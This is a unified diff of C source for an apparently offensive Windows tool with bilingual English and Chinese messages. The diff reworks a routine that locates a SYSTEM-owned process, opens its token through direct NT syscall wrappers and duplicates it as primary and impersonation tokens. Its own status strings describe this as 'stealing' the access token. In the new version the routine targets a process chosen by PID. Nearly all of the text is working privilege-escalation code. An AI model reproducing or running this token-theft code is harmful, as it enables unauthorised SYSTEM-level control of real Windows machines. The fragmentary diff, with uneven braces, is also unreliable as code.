@@ -4,17 +4,13 @@
 #include "starfly.h"
 #include <stdbool.h>
 #include <locale.h>
-HANDLE hDupPriToken = 0xcccccccccccccccc;
-HANDLE hDupImpToken = 0xcccccccccccccccc;
-HANDLE hToken = 0xcccccccccccccccc;
-HANDLE hSysProcess = 0xcccccccccccccccc;
-
-void LocalPrivilegeErrorHandler() {
+HANDLE hToken;
+void TILocalPrivilegeErrorHandler() {
     setlocale(LC_ALL, "");
-        if (o_mode == 1){
-            o_mode = 2;
+        if (o_mode == 4){
+            o_mode = 5;
             status = SFNtDuplicateToken(hToken, TOKEN_ALL_ACCESS, NULL, FALSE, TokenImpersonation, &hDupImpToken);
-        } else if (o_mode == 2) {
+        } else if (o_mode == 5) {
             if (hDupPriToken != 0xcccccccccccccccc && hDupPriToken != 0 && hDupImpToken != 0xcccccccccccccccc && hDupImpToken != 0) {
     SFPrintStatus("Looking up Token Information.", "正在检验令牌信息");
     ULONG returnLength;
@@ -167,7 +163,7 @@ void LocalPrivilegeErrorHandler() {
                 o_restart = 1;
                 main();
             } else {
-                SFPrintError("Failed to Duplicaet Token.", "复制令牌失败");
+                SFPrintError("Failed to Duplicate Token.", "复制令牌失败");
                 o_restart = 1;
                 main();
             }
@@ -180,55 +176,32 @@ void LocalPrivilegeErrorHandler() {
             return;
 }
 
-void SFLocalPrivilege() {
+void SFGetToken(DWORD pid) {
     NTSTATUS status;
     ULONG bufferSize = 1024 * 1024;
     PVOID buffer = malloc(bufferSize);
     status = SFNtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &bufferSize);
     PSYSTEM_PROCESS_INFORMATION processInfo = (PSYSTEM_PROCESS_INFORMATION)buffer;
-    SFPrintStatus("Searching for a Proper Process to Steal Access Token.", "正在寻找合适的进程进行访问令牌窃取");
+    SFPrintStatus("Searching for the Targeted Process", "正在寻找目标进程以进行访问令牌窃取");
     while (1) {
-        hSysProcess = 0xcccccccccccccccc;
+        HANDLE hProcess = 0xcccccccccccccccc;
         OBJECT_ATTRIBUTES objectAttributes;
         CLIENT_ID clientId;
         clientId.UniqueProcess = processInfo->UniqueProcessId;
         clientId.UniqueThread = NULL;
         InitializeObjectAttributes(&objectAttributes, NULL, 0, NULL, NULL);
-        status = SFNtOpenProcess(&hSysProcess, MAXIMUM_ALLOWED, &objectAttributes, &clientId);
-        if (hSysProcess != 0xcccccccccccccccc && hSysProcess != 0) {
+        status = SFNtOpenProcess(&hProcess, MAXIMUM_ALLOWED, &objectAttributes, &clientId);
+        if ((hProcess != 0xcccccccccccccccc) && (hProcess != 0) && (DWORD)(ULONG_PTR)processInfo->UniqueProcessId == pid) {
             hToken = 0xcccccccccccccccc;
-            status = SFNtOpenProcessToken(hSysProcess, MAXIMUM_ALLOWED, &hToken);
+            status = SFNtOpenProcessToken(hProcess, MAXIMUM_ALLOWED, &hToken);
             if (hToken != 0xcccccccccccccccc && hToken != 0) {
-                ULONG returnLength;
-                PTOKEN_USER tokenUser;
-                status = SFNtQueryInformationToken(hToken, TokenUser, NULL, 0, &returnLength);
-                tokenUser = (PTOKEN_USER)malloc(returnLength);
-                status = SFNtQueryInformationToken(hToken, TokenUser, tokenUser, returnLength, &returnLength);
-                PTOKEN_OWNER tokenOwner;
-                status = SFNtQueryInformationToken(hToken, TokenOwner, NULL, 0, &returnLength);
-                tokenOwner = (PTOKEN_OWNER)malloc(returnLength);
-                status = SFNtQueryInformationToken(hToken, TokenOwner, tokenOwner, returnLength, &returnLength);
-                if (tokenOwner->Owner != 0xcdcdcdcdcdcdcdcd) {
-                    TCHAR ownerName[256];
-                    TCHAR ownerDomain[256];
-                    DWORD ownerNameSize = 256;
-                    DWORD ownerDomainSize = 256;
-                    SID_NAME_USE ownerUse;
-                    BOOL ownerLookupSuccess = LookupAccountSid(NULL, tokenOwner->Owner, ownerName, &ownerNameSize, ownerDomain, &ownerDomainSize, &ownerUse);
-                    TCHAR userName[256];
-                    TCHAR userDomain[256];
-                    DWORD userNameSize = 256;
-                    DWORD userDomainSize = 256;
-                    SID_NAME_USE userUse;
-                    BOOL userLookupSuccess = LookupAccountSid(NULL, tokenUser->User.Sid, userName, &userNameSize, userDomain, &userDomainSize, &userUse);
-                    if (ownerLookupSuccess && userLookupSuccess) {
-                        if (wcscmp(ownerName, L"Administrators") == 0 && wcscmp(userName, L"SYSTEM") == 0) {
-                            if (processInfo->SessionId == 0) {
-                                SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
+                if (processInfo->SessionId == 0) { 
+                            SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
                             }
                             else {
                                 SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
                             }
+                            SFPrintStatus("Target Located", "发现目标");
                             printf("----------------------------------------\n");
                             if (o_lang % 2 == 0) {
                                 printf(" PID: %llu\n Name: %wZ\n",
@@ -241,25 +214,19 @@ void SFLocalPrivilege() {
                                     &processInfo->ImageName);
                             }
                             printf("----------------------------------------\n");
-                            SFPrintStatus("Detected Accessible SYSTEM Process", "发现可访问的系统进程");
                             hDupPriToken = 0xcccccccccccccccc;
                             hDupImpToken = 0xcccccccccccccccc;
-                            o_mode = 1;
+                            o_mode = 4;
                             SFPrintStatus("Attempting to Steal Access Token", "尝试窃取访问令牌");
                             status = SFNtDuplicateToken(hToken, TOKEN_ALL_ACCESS, NULL, FALSE, TokenPrimary, &hDupPriToken);
-                        }
-                    }
                 }
-                    free(tokenOwner);
-                    free(tokenUser);
-                    SFNtClose(hToken);
-                }
-                SFNtClose(hSysProcess);
+                SFNtClose(hProcess);
+                break;
             }
             if (processInfo->NextEntryOffset == 0)
                 break;
             processInfo = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)processInfo + processInfo->NextEntryOffset);
         }
-        SFPrintError("Failed to Obtain SYSTEM Token.", "获取SYSTEM令牌失败");
+        SFPrintError("Target Not Found", "未找到目标");
         free(buffer);
     }
